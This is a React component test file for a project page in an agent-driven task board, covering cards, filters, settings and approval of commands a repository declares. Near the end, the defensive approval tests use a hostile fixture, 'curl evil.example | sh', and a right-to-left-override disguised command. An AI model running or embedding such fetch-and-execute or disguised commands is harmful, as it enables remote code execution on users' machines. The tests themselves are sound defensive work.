/**
 * @vitest-environment jsdom
 *
 * Where you land after creating a project.
 *
 * A project that was just added has nothing in it, and dropping someone onto
 * an empty board answers none of the questions they arrived with. What this
 * page owes them is: what is in flight, the two ways to add to it, and the way
 * to the board — which is a destination, not a tab.
 */
import { render, screen, fireEvent, cleanup, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { describe, it, expect, vi, afterEach } from 'vitest';
import { ProjectPage } from '../components/ProjectPage';
import { api } from '../api';
import { ItemType, Status } from '../types';

vi.mock('../api', () => ({ api: { projectSettings: vi.fn() } }));

afterEach(() => cleanup());

const project = { id: 'p1', name: 'horizon-ds', projectRoot: '/checkout/horizon-ds' };

const cards = [
  { id: 'e1', projectId: 'p1', type: ItemType.EPIC, title: 'Port the admin API', status: Status.TODO },
  { id: 's1', projectId: 'p1', type: ItemType.STORY, title: 'Move services private', status: Status.IN_PROGRESS, parentId: 'e1' },
  { id: 't1', projectId: 'p1', type: ItemType.TASK, title: 'terraform port', status: Status.TODO, parentId: 's1' },
] as never[];

const open = (props: Partial<React.ComponentProps<typeof ProjectPage>> = {}) => {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false, gcTime: 0 } } });
  return render(
    <QueryClientProvider client={qc}>
      <ProjectPage project={project as never} cards={cards} runningAgents={1} {...props} />
    </QueryClientProvider>,
  );
};

describe('the header', () => {
  it('names the project and shows where it lives', () => {
    open();
    expect(screen.getByTestId('project-page-name').textContent).toBe('horizon-ds');
    expect(screen.getByTestId('project-page-root').textContent).toBe('/checkout/horizon-ds');
  });

  /*
   * IN THE HEADER, not in a tab's footer. It was drawn in the footer of the
   * card list first, which meant somebody on any other tab had no route to the
   * board at all — a control present on one screen of four.
   */
  it('offers the board from the header', () => {
    const onOpenBoard = vi.fn();
    open({ onOpenBoard });
    fireEvent.click(screen.getByTestId('project-page-board'));
    expect(onOpenBoard).toHaveBeenCalledWith('p1');
  });

  it('says so when the project has no folder yet', () => {
    // A project with no checkout cannot host an agent, and the page is where
    // that becomes visible rather than at the moment a run fails.
    open({ project: { id: 'p1', name: 'horizon-ds' } as never });
    expect(screen.getByTestId('project-page-root').textContent).toMatch(/no folder/i);
  });
});

describe('what is in flight', () => {
  it('lists the cards, nested the way the tree nests them', () => {
    open();
    // The child is indented under its parent: a flat list of three titles says
    // nothing about which story the task belongs to.
    // On the ROW, which now carries the title and the start button together —
    // indenting only the title would step the two apart.
    const row = (id: string) => screen.getByTestId(`project-card-${id}`).parentElement as HTMLElement;
    expect(row('e1').style.marginLeft).toBe('0px');
    expect(row('s1').style.marginLeft).toBe('18px');
    expect(row('t1').style.marginLeft).toBe('36px');
  });

  it('shows what kind of work each one is', () => {
    open();
    expect(screen.getByTestId('project-card-type-e1')).toBeDefined();
  });

  it('counts what is there, as information rather than a third button', () => {
    open();
    expect(screen.getByTestId('project-page-summary').textContent).toMatch(/3 cards/);
    expect(screen.getByTestId('project-page-summary').textContent).toMatch(/1 agent/);
  });

  it('counts in the singular when there is one of something', () => {
    open({ cards: [cards[0]], runningAgents: 0 });
    expect(screen.getByTestId('project-page-summary').textContent).toMatch(/1 card/);
    expect(screen.getByTestId('project-page-summary').textContent).not.toMatch(/agent/);
  });

  it('opens a card when it is clicked', () => {
    const onOpenCard = vi.fn();
    open({ onOpenCard });
    fireEvent.click(screen.getByTestId('project-card-s1'));
    expect(onOpenCard).toHaveBeenCalledWith(cards[1]);
  });
});

describe('the empty project', () => {
  /*
   * ONE DOOR, not two. Describing the objective already covers writing a
   * single card — the contract tells the agent to propose one item when the
   * objective is one unit of work — so a second button beside it was a choice
   * the product was asking for and did not need. Writing by hand moved inside
   * the panel, where it is the path that still works with no agent.
   */
  it('offers one door, and it is the one that proposes', () => {
    open({ cards: [] });
    expect(screen.getByTestId('project-page-empty')).toBeDefined();
    expect(screen.getByTestId('project-page-ask').textContent).toMatch(/new task/i);
    expect(screen.queryByTestId('project-page-new')).toBeNull();
  });

  it('still offers the board, because an empty project can still have one', () => {
    open({ cards: [] });
    expect(screen.getByTestId('project-page-board')).toBeDefined();
  });
});

describe('the door', () => {
  it('starts a task in this project', () => {
    const onAsk = vi.fn();
    open({ onAsk });
    fireEvent.click(screen.getByTestId('project-page-ask'));
    expect(onAsk).toHaveBeenCalledWith('p1');
  });
});

// ── Settings, and the reason this page is a page ───────────────────────────
// Half of a project's configuration is inferred, and an inferred value that is
// wrong is invisible: four projects on this machine have a folder pointing at
// $HOME. The rows exist so that is readable.
describe('the settings tab', () => {
  const rows = [
    {
      key: 'projectRoot', label: 'Project folder', description: 'Where agents run.',
      value: '/Users/me', origin: 'main-only', from: 'Set when the project was added.',
      how: 'agenfk update-project <id>',
      warning: 'This is your home directory. Worktrees would be cut from it.',
    },
    {
      key: 'autoWorktree', label: 'A worktree per card', description: 'Cut one when a card starts.',
      value: 'On', origin: 'set-here', from: 'The one thing this page owns.',
    },
    {
      key: 'setupCommand', label: 'Setup command', description: 'Run once in a fresh worktree.',
      value: null, origin: 'cli-only', from: 'Not set.',
      how: 'agenfk update-project <id> --setup-command "<cmd>"',
      warning: 'A new worktree starts with no dependencies installed.',
    },
  ];

  it('asks for nothing until the tab is opened', async () => {
    open();
    // Most visits are about the cards, and this answer walks the flow and the
    // filesystem defaults to build itself.
    expect(api.projectSettings).not.toHaveBeenCalled();
  });

  it('shows each value with where it came from, in a sentence', async () => {
    // It used to assert the model's own slugs — "main only", "set here" — and
    // that is precisely what read as jargon on screen, with the one that
    // sounded like an invitation sitting on a row nothing could press.
    (api.projectSettings as any).mockResolvedValue({ projectId: 'p1', rows });
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    await waitFor(() => screen.getByTestId('setting-projectRoot'));
    expect(screen.getByTestId('setting-origin-projectRoot').textContent)
      .toMatch(/only the desktop app can set this/i);
    expect(screen.getByTestId('setting-origin-projectRoot').textContent).not.toMatch(/main.only/i);
    expect(screen.getByTestId('setting-origin-autoWorktree').textContent)
      .toMatch(/chosen for this project|set for this project/i);
  });

  it('shows the value even when the row cannot be edited here', async () => {
    // Hiding what cannot be edited is exactly how an inferred value stays
    // wrong for four projects.
    (api.projectSettings as any).mockResolvedValue({ projectId: 'p1', rows });
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    await waitFor(() => screen.getByTestId('setting-projectRoot'));
    expect(screen.getByTestId('setting-projectRoot').textContent).toContain('/Users/me');
    expect(screen.getByTestId('setting-how-projectRoot').textContent).toMatch(/agenfk update-project/);
  });

  it('says what a wrong or missing value costs', async () => {
    (api.projectSettings as any).mockResolvedValue({ projectId: 'p1', rows });
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    await waitFor(() => screen.getByTestId('setting-warning-projectRoot'));
    expect(screen.getByTestId('setting-warning-projectRoot').textContent).toMatch(/home directory/i);
    expect(screen.getByTestId('setting-warning-setupCommand').textContent).toMatch(/dependencies/i);
  });

  it('keeps the board reachable from Settings', async () => {
    // The defect this page went through three rounds to remove: a control that
    // exists on one screen of several.
    (api.projectSettings as any).mockResolvedValue({ projectId: 'p1', rows });
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    expect(screen.getByTestId('project-page-board')).toBeDefined();
  });
});

/*
 * Starting work from the row.
 *
 * The page listed the cards and could do nothing with them: opening a terminal
 * meant going to the board and finding the same card again. The press stays a
 * press — creating cards still spawns nothing — it just exists where the cards
 * are.
 */
describe('starting an agent from a card', () => {
  const rows = [
    { id: 'i1', projectId: 'p1', type: ItemType.TASK, title: 'port the admin API', status: Status.TODO },
    { id: 'i2', projectId: 'p1', type: ItemType.TASK, title: 'terraform the gateway', status: Status.IN_PROGRESS },
  ] as never;

  it('hands the card back, so the caller decides between resuming and asking', async () => {
    const onStartAgent = vi.fn();
    open({ cards: rows, onStartAgent });
    fireEvent.click(screen.getByTestId('project-card-start-i1'));
    expect(onStartAgent).toHaveBeenCalledWith(rows[0]);
  });

  it('says Open, not Start, where a session is already running', async () => {
    // Spawning a second agent in the same worktree is possible from the tab
    // bar and is not what pressing a card's own button means.
    open({ cards: rows, working: { i2: 'ours' }, onStartAgent: () => {} });
    expect(screen.getByTestId('project-card-start-i2').textContent).toContain('Open');
    expect(screen.getByTestId('project-card-start-i1').textContent).toContain('Start');
    expect(screen.getByTestId('project-card-live-i2')).toBeTruthy();
  });

  it('names the card it will act on, so a column of identical buttons is not a guess', async () => {
    open({ cards: rows, onStartAgent: () => {} });
    expect(screen.getByTestId('project-card-start-i1').getAttribute('aria-label'))
      .toBe('Start an agent on port the admin API');
  });

  it('opening the card is still its own gesture', async () => {
    // Two things on one row, and they stay separate: the title reveals it on
    // the board, the button starts work.
    const onOpenCard = vi.fn();
    const onStartAgent = vi.fn();
    open({ cards: rows, onOpenCard, onStartAgent });
    fireEvent.click(screen.getByTestId('project-card-i1'));
    expect(onOpenCard).toHaveBeenCalledWith(rows[0]);
    expect(onStartAgent).not.toHaveBeenCalled();
  });

  it('shows no button at all when the host has nowhere to send it', async () => {
    // A control that calls nothing is the dead button this product has drawn
    // three times.
    open({ cards: rows });
    expect(screen.queryByTestId('project-card-start-i1')).toBeNull();
  });
});


/*
 * Filtering 135 cards.
 *
 * The states are NOT a fixed list: they come from the project's active flow,
 * the same query the board derives its columns from. The project in the report
 * that prompted this runs a TDD flow — DISCOVERY, CREATE_UNIT_TESTS, REFACTOR —
 * none of which exists in the default, so a hard-coded list would offer states
 * the project does not have and hide the ones it does.
 */
describe('filtering the cards', () => {
  const FLOW = {
    id: 'f1',
    name: 'TDD Flow',
    steps: [
      { name: 'TODO', order: 0, isSpecial: true },
      { name: 'DISCOVERY', order: 1 },
      { name: 'CREATE_UNIT_TESTS', order: 2 },
      { name: 'DONE', order: 9, isSpecial: true },
    ],
  };

  const many = [
    { id: 'e1', projectId: 'p1', type: ItemType.EPIC, title: 'Port the admin API', status: Status.TODO },
    { id: 's1', projectId: 'p1', type: ItemType.STORY, title: 'Move services private', parentId: 'e1', status: 'DISCOVERY' },
    { id: 't1', projectId: 'p1', type: ItemType.TASK, title: 'terraform port', parentId: 's1', status: 'CREATE_UNIT_TESTS' },
    { id: 'b1', projectId: 'p1', type: ItemType.BUG, title: 'span cardinality', status: Status.DONE },
  ] as never;

  const openFiltered = () => open({ cards: many, flow: FLOW as never });

  it('offers the states THIS project has, not a fixed list', async () => {
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-status'));
    await waitFor(() => screen.getByTestId('project-filter-status-CREATE_UNIT_TESTS'));
    expect(screen.getByTestId('project-filter-status-DISCOVERY')).toBeTruthy();
    // IN_PROGRESS and REVIEW belong to the default flow, not to this one.
    expect(screen.queryByTestId('project-filter-status-IN_PROGRESS')).toBeNull();
  });

  it('keeps the anchors, which are where most cards sit', async () => {
    // TODO and DONE are `isSpecial` — the board hides them as columns, and
    // filtering is the one place they matter most.
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-status'));
    await waitFor(() => screen.getByTestId('project-filter-status-TODO'));
    expect(screen.getByTestId('project-filter-status-DONE')).toBeTruthy();
  });

  it('filters by type', async () => {
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-type'));
    fireEvent.click(await screen.findByTestId('project-filter-type-BUG'));
    await waitFor(() => expect(screen.queryByTestId('project-card-e1')).toBeNull());
    expect(screen.getByTestId('project-card-b1')).toBeTruthy();
  });

  it('filters by state', async () => {
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-status'));
    fireEvent.click(await screen.findByTestId('project-filter-status-DISCOVERY'));
    await waitFor(() => expect(screen.getByTestId('project-card-s1')).toBeTruthy());
    expect(screen.queryByTestId('project-card-t1')).toBeNull();
  });

  it('says how many of how many, so the count cannot lie', async () => {
    openFiltered();
    expect(screen.getByTestId('project-page-count').textContent).toBe('4 cards');
    fireEvent.click(screen.getByTestId('project-filter-type'));
    fireEvent.click(await screen.findByTestId('project-filter-type-BUG'));
    await waitFor(() =>
      expect(screen.getByTestId('project-page-count').textContent).toBe('1 of 4 cards'));
  });

  it('flattens while filtered, because an indent without its parent is a lie', async () => {
    // t1 sits two levels deep. With its ancestors filtered out, indenting it
    // would draw a child of nothing.
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-status'));
    fireEvent.click(await screen.findByTestId('project-filter-status-CREATE_UNIT_TESTS'));
    await waitFor(() => screen.getByTestId('project-card-t1'));
    const row = screen.getByTestId('project-card-t1').parentElement as HTMLElement;
    expect(row.style.marginLeft).toBe('0px');
  });

  it('nests again when the filter is cleared', async () => {
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-type'));
    fireEvent.click(await screen.findByTestId('project-filter-type-TASK'));
    await waitFor(() => screen.getByTestId('project-card-t1'));
    fireEvent.click(screen.getByTestId('project-filter-type'));
    fireEvent.click(await screen.findByTestId('project-filter-type-all'));
    await waitFor(() => screen.getByTestId('project-card-e1'));
    const row = screen.getByTestId('project-card-t1').parentElement as HTMLElement;
    expect(row.style.marginLeft).toBe('36px');
  });

  it('says the filter is what emptied the list, not the project', async () => {
    // "No cards yet" is wrong when there are 135 and a filter that matches
    // none of them.
    openFiltered();
    fireEvent.click(screen.getByTestId('project-filter-status'));
    fireEvent.click(await screen.findByTestId('project-filter-status-DONE'));
    fireEvent.click(screen.getByTestId('project-filter-type'));
    fireEvent.click(await screen.findByTestId('project-filter-type-EPIC'));
    await waitFor(() => screen.getByTestId('project-page-no-match'));
    expect(screen.queryByTestId('project-page-empty')).toBeNull();
  });

  it('shows no filters at all when the project has no cards', async () => {
    // Controls that can only ever produce the empty list they are already
    // showing.
    open({ cards: [] });
    expect(screen.queryByTestId('project-filter-type')).toBeNull();
  });
});


/*
 * Settings you can act on.
 *
 * The screen said SET HERE / CLI ONLY / MAIN ONLY — the model's own words for
 * where a value came from — on a screen where nothing could be pressed. So the
 * one badge that promised action was the one attached to a value you could not
 * change, and the two that named a real limit read as jargon.
 */
describe('the settings tab', () => {
  const settings = [
    {
      key: 'flow', label: 'Flow', description: 'The steps a card moves through.',
      value: 'TDD Flow', origin: 'set-here', from: 'Chosen for this project.',
    },
    {
      // What core's describeProjectSettings produces: 'On'/'Off', capitalised. A
      // lowercase stand-in here is how the switch shipped reading every project as off.
      key: 'autoWorktree', label: 'A worktree per card', description: 'Cut a worktree when a card starts.',
      value: 'On', origin: 'set-here', from: 'Set for this project.',
    },
    {
      key: 'verifyCommand', label: 'Verify command', description: 'Run on the last step.',
      value: null, origin: 'cli-only', from: 'Not set.',
      how: 'agenfk update-project <id> --verify-command "<cmd>"',
      warning: 'Without one, a card cannot reach the last step at all.',
    },
  ];

  const openSettings = async () => {
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({ rows: settings } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    return waitFor(() => screen.getByTestId('setting-flow'));
  };

  it('says where a value came from in words, not in slugs', async () => {
    await openSettings();
    const row = screen.getByTestId('setting-verifyCommand');
    expect(row.textContent).not.toMatch(/cli.only/i);
    expect(row.textContent).toMatch(/only the CLI can set this/i);
  });

  it('changes the flow from here, which is what the row is about', async () => {
    await openSettings();
    fireEvent.click(screen.getByTestId('setting-change-flow'));
    await waitFor(() => screen.getByTestId('org-flow-picker'));
  });

  it('turns a worktree per card on and off, and says so to the server', async () => {
    const updateProject = vi.fn(async () => ({}));
    (api as unknown as { updateProject: typeof updateProject }).updateProject = updateProject;
    await openSettings();
    fireEvent.click(screen.getByTestId('setting-toggle-autoWorktree'));
    await waitFor(() => expect(updateProject).toHaveBeenCalledWith('p1', { autoWorktree: false }));
  });

  it('draws the switch in the state the project is in', async () => {
    await openSettings();
    expect(screen.getByTestId('setting-toggle-autoWorktree').getAttribute('aria-checked')).toBe('true');
  });

  it('turns it on from off, too', async () => {
    const updateProject = vi.fn(async () => ({}));
    (api as unknown as { updateProject: typeof updateProject }).updateProject = updateProject;
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows: settings.map(r => (r.key === 'autoWorktree' ? { ...r, value: 'Off' } : r)),
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    const toggle = await waitFor(() => screen.getByTestId('setting-toggle-autoWorktree'));
    expect(toggle.getAttribute('aria-checked')).toBe('false');
    fireEvent.click(toggle);
    await waitFor(() => expect(updateProject).toHaveBeenCalledWith('p1', { autoWorktree: true }));
  });

  it('lets the switch be the value, instead of repeating it as text underneath', async () => {
    await openSettings();
    const row = screen.getByTestId('setting-autoWorktree');
    expect(row.querySelector('[data-testid="setting-value-autoWorktree"]')).toBeNull();
    // The rows without a switch keep their value box.
    expect(screen.getByTestId('setting-value-flow').textContent).toBe('TDD Flow');
  });

  it('offers no switch for a value this screen may not write', async () => {
    // The row still SHOWS — hiding what cannot be edited here is how a wrong
    // project root stayed invisible in four projects — but it must not grow a
    // control that would fail.
    await openSettings();
    expect(screen.queryByTestId('setting-toggle-verifyCommand')).toBeNull();
    expect(screen.getByTestId('setting-how-verifyCommand')).toBeTruthy();
  });

  it('keeps the warning, which is the reason the row exists', async () => {
    await openSettings();
    expect(screen.getByTestId('setting-warning-verifyCommand').textContent)
      .toMatch(/cannot reach the last step/i);
  });
});


/*
 * The second door: an ordinary terminal, with no card.
 *
 * The challenge this answers — create a task just by opening a terminal. The
 * agent runs in the checkout and writes the card itself with the CLI. It is
 * deliberately the quieter of the two: "New task" shows you the tree before
 * anything is written, this one does not.
 */
describe('opening a terminal on the project', () => {
  it('asks the host for one, with no card involved', () => {
    const onOpenTerminal = vi.fn();
    open({ onOpenTerminal });
    fireEvent.click(screen.getByTestId('project-page-terminal'));
    expect(onOpenTerminal).toHaveBeenCalledTimes(1);
  });

  it('is absent when the host has nowhere to send it', () => {
    // The dead button this product has drawn three times.
    open();
    expect(screen.queryByTestId('project-page-terminal')).toBeNull();
  });

  it('does not replace the door that proposes first', () => {
    open({ onOpenTerminal: () => {} });
    expect(screen.getByTestId('project-page-ask')).toBeTruthy();
  });
});


/*
 * Three states, because there are three situations and the button had two.
 *
 * A card in REFACTOR with an agent already working on it was offering to
 * "Start" — and pressing it opened a SECOND agent in the same worktree. The
 * work can be running in a terminal this app owns, in a conversation this app
 * owns (a subagent's run, whose sessionId matches one of our sessions), or
 * somewhere else entirely. Only the last one is "nothing here is working on
 * it", and only it may offer to start.
 */
describe('what the row offers while an agent is working', () => {
  const rows = [
    { id: 'i1', projectId: 'p1', type: ItemType.TASK, title: 'ours', status: Status.TODO },
    { id: 'i2', projectId: 'p1', type: ItemType.TASK, title: 'parent', status: 'REFACTOR' },
    { id: 'i3', projectId: 'p1', type: ItemType.TASK, title: 'elsewhere', status: 'IN_PROGRESS' },
    { id: 'i4', projectId: 'p1', type: ItemType.TASK, title: 'idle', status: Status.TODO },
  ] as never;

  const working = {
    i1: 'ours' as const,
    i2: 'ours' as const,
    i3: 'elsewhere' as const,
  };

  it('says Open where this app can take you to the agent', () => {
    open({ cards: rows, working, onStartAgent: () => {} });
    expect(screen.getByTestId('project-card-start-i1').textContent).toContain('Open');
    expect(screen.getByTestId('project-card-start-i2').textContent).toContain('Open');
  });

  it('does not offer to start a second agent on a card that already has one', () => {
    // The press used to fall through to "which agent?", which spawns.
    const onStartAgent = vi.fn();
    open({ cards: rows, working, onStartAgent });
    expect(screen.getByTestId('project-card-start-i3').textContent).not.toMatch(/start/i);
    fireEvent.click(screen.getByTestId('project-card-start-i3'));
    expect(onStartAgent).not.toHaveBeenCalled();
  });

  it('shows the run instead, because that is what there is to see', () => {
    const onShowRuns = vi.fn();
    open({ cards: rows, working, onShowRuns, onStartAgent: () => {} });
    fireEvent.click(screen.getByTestId('project-card-start-i3'));
    expect(onShowRuns).toHaveBeenCalledWith(rows[2]);
  });

  it('still offers Start where nothing is working on the card', () => {
    const onStartAgent = vi.fn();
    open({ cards: rows, working, onStartAgent });
    expect(screen.getByTestId('project-card-start-i4').textContent).toContain('Start');
    fireEvent.click(screen.getByTestId('project-card-start-i4'));
    expect(onStartAgent).toHaveBeenCalledWith(rows[3]);
  });
});


/*
 * A setting the repository declares.
 *
 * `.agenfk/project.json` travels with the repo, so what it says is the same for
 * everyone who clones — which is why it wins, and why this screen must stop
 * offering to change it: the next read of the file would put it back, and a
 * control that silently loses is worse than no control.
 */
describe('settings the project file decided', () => {
  const rows = [
    {
      key: 'flow', label: 'Flow', description: 'The steps a card moves through.',
      value: 'TDD Flow', origin: 'from-file',
      from: 'Declared by the repository, in .agenfk/project.json.',
    },
    {
      key: 'autoWorktree', label: 'A worktree per card', description: 'Cut a worktree when a card starts.',
      value: 'On', origin: 'from-file',
      from: 'Declared by the repository, in .agenfk/project.json.',
    },
  ];

  const openSettings = async () => {
    (api.projectSettings as never as ReturnType<typeof vi.fn>)
      .mockResolvedValue({ rows, fileProblems: [] } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    return waitFor(() => screen.getByTestId('setting-flow'));
  };

  it('does not offer to change the flow the file fixed', async () => {
    await openSettings();
    expect(screen.queryByTestId('setting-change-flow')).toBeNull();
  });

  it('does not offer a switch for a worktree setting the file fixed', async () => {
    await openSettings();
    expect(screen.queryByTestId('setting-toggle-autoWorktree')).toBeNull();
    // With no switch, the text is the only thing saying which way it is.
    expect(screen.getByTestId('setting-value-autoWorktree').textContent).toBe('On');
  });

  it('says where the value came from, with the file', async () => {
    await openSettings();
    expect(screen.getByTestId('setting-origin-flow').textContent)
      .toContain('.agenfk/project.json');
  });

  it('shows what the file asked for and could not have', async () => {
    // A hand-edited file with a key that does nothing has to say so, or
    // somebody spends an afternoon on it.
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows,
      fileProblems: ['projectRoot is where this checkout lives on THIS machine, so it cannot travel with the repository.'],
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    await waitFor(() => screen.getByTestId('setting-file-problems'));
    expect(screen.getByTestId('setting-file-problems').textContent).toMatch(/projectRoot/);
  });
});


/*
 * 34ee6b8a: approving a command the repository declares is a person's act on
 * the board - the CLI route the agent could reach is gone - so the row that
 * shows the command is where the approval happens.
 */
describe('a command the repository asks to run', () => {
  const rows = [
    { key: 'flow', label: 'Flow', description: 'The steps a card moves through.', value: 'TDD Flow', origin: 'set-here', from: 'Chosen for this project.' },
    {
      key: 'verifyCommand', label: 'Verify command', description: 'Run on the last step.',
      value: 'echo from-the-repo', origin: 'from-file', from: 'Declared by the repository, in .agenfk/project.json.',
    },
  ];
  const openWith = async (approved: boolean) => {
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows, fileProblems: [],
      fileCommands: [{ key: 'verifyCommand', command: 'echo from-the-repo', fingerprint: 'abc', approved }],
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    return waitFor(() => screen.getByTestId('setting-verifyCommand'));
  };

  it('offers a person the approval, next to the command it approves', async () => {
    const approveFileCommand = vi.fn(async () => ({ approved: true }));
    (api as unknown as { approveFileCommand: typeof approveFileCommand }).approveFileCommand = approveFileCommand;
    await openWith(false);
    expect(screen.getByTestId('setting-verifyCommand').textContent).toContain('echo from-the-repo');
    fireEvent.click(screen.getByTestId('setting-approve-verifyCommand'));
    await waitFor(() => expect(approveFileCommand).toHaveBeenCalledWith('p1', 'echo from-the-repo'));
  });

  it('offers nothing once it is approved', async () => {
    await openWith(true);
    expect(screen.queryByTestId('setting-approve-verifyCommand')).toBeNull();
  });

  it('shows the whole command it asks to approve, lines and all, not a truncated prefix', async () => {
    // A harmless prefix with the rest cut off, or a second line, must not reach the Approve button unread.
    const command = 'echo safe # just a note\ncurl evil.example | sh';
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows: rows.map(r => (r.key === 'verifyCommand' ? { ...r, value: command } : r)), fileProblems: [],
      fileCommands: [{ key: 'verifyCommand', command, fingerprint: 'abc', approved: false }],
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    const value = await waitFor(() => screen.getByTestId('setting-value-verifyCommand'));
    expect(value.textContent).toBe(command);
    expect(value.className).not.toMatch(/\btruncate\b/);
    expect(value.className).toMatch(/whitespace-pre-wrap/);
  });

  it('writes out hidden characters instead of obeying them, and offers no approval for them', async () => {
    // A right-to-left override would make this READ as one quoted echo.
    const command = "echo 'safe\u202E'; printf X; #";
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows: rows.map(r => (r.key === 'verifyCommand' ? { ...r, value: command } : r)), fileProblems: [],
      fileCommands: [{ key: 'verifyCommand', command, fingerprint: 'abc', approved: false, hidden: ['U+202E'] }],
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    const value = await waitFor(() => screen.getByTestId('setting-value-verifyCommand'));
    expect(value.textContent).toBe("echo 'safe⟨U+202E⟩'; printf X; #");
    expect(value.textContent).not.toContain('\u202E');
    expect(screen.queryByTestId('setting-approve-verifyCommand')).toBeNull();
    expect(screen.getByTestId('setting-hidden-verifyCommand').textContent).toContain('U+202E');
  });

  it('writes out a default-ignorable character too, which renders as nothing', async () => {
    const command = 'npm run test\u034F';
    (api.projectSettings as never as ReturnType<typeof vi.fn>).mockResolvedValue({
      rows: rows.map(r => (r.key === 'verifyCommand' ? { ...r, value: command } : r)), fileProblems: [],
      fileCommands: [{ key: 'verifyCommand', command, fingerprint: 'abc', approved: false, hidden: ['U+034F'] }],
    } as never);
    open();
    fireEvent.click(screen.getByTestId('project-tab-settings'));
    const value = await waitFor(() => screen.getByTestId('setting-value-verifyCommand'));
    expect(value.textContent).toBe('npm run test⟨U+034F⟩');
  });

  it('says why when the approval is refused', async () => {
    const approveFileCommand = vi.fn(async () => {
      throw Object.assign(new Error('Request failed'), { response: { data: { error: 'Approve it from the board this server serves.' } } });
    });
    (api as unknown as { approveFileCommand: typeof approveFileCommand }).approveFileCommand = approveFileCommand;
    await openWith(false);
    fireEvent.click(screen.getByTestId('setting-approve-verifyCommand'));
    await waitFor(() => expect(screen.getByTestId('setting-approve-error-verifyCommand').textContent)
      .toContain('Approve it from the board this server serves.'));
  });
});
